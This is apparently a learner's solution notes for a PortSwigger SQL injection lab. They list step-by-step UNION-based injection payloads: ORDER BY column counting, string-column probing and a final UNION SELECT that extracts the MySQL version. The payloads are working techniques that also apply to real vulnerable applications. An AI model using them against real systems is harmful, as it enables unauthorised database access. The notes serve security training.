--Name: SQL injection attack, querying the database type and version on MySQL and Microsoft
--URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
--Level:Medium Time: 10 min
---------------------------------------------------------------------------------

-- Objective: display the database version string.
-- DB Type: MySQL

SELECT * FROM products WHERE category = 'Gifts'--%20 ???
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 1--%20 ???     OK
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 2--%20 ???     OK
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--%20 ???     Error


SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT NULL, NULL--%20 ???    OK
SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT 's', NULL--%20  ???    OK
SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT NULL, 's'--%20  ???    OK

SELECT ?, ? FROM products WHERE category = 'Gifts' UNION SELECT NULL, version()--%20 ???     Solved

-------------------------------
-- 8.0.26
-------------------------------

